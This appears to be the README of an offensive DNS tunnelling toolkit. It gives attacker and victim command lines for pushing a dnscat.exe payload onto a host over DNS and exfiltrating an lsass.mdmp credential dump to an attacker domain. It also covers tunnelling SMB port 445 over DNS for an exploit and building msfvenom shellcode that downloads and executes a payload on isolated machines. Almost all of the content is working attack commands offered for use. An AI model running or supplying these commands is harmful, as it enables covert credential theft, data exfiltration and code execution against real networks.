# GPL

Correct `yourzone.tk`.

### Infiltration (File upload)

Change loops count (ex. 1190) in `dns_download.vbs` before running.
```
attacker> sudo ./dns_upload.py --udp --file dnscat.exe
victim> cscript.exe dns_download.vbs
victim> ./dns_download.sh attacker.tk 1190 /tmp/dnscat
```

### Exfiltration (File download)

```
attacker> sudo ./dns_download.py --udp --file lsass.mdmp
victim> cscript.exe dns_upload.vbs c:\path\to\lsass.mdmp attacker.tk
```

### Dns-to-Tcp [WIP]

```
victim> set TIMEOUT=1000
victim> set DNS_SIZE=50
victim> dns_tcp.exe c 127.0.0.1 445
attacker> sudo ./dns_tcp.py --udp --port 53 -l 445
attacker> exploit.py localhost 445
```

### Dns-Shellcode
It can be used as dns-shellcode alternative for exploiting isolated hosts:
```
msfvenom -p windows/exec CMD=$(cat dns_download_exec.bat) -f raw -o dns_shellcode
msfvenom -p linux/x86/exec CMD=$(cat dns_download_exec.sh) -f raw -o dns_shellcode
```
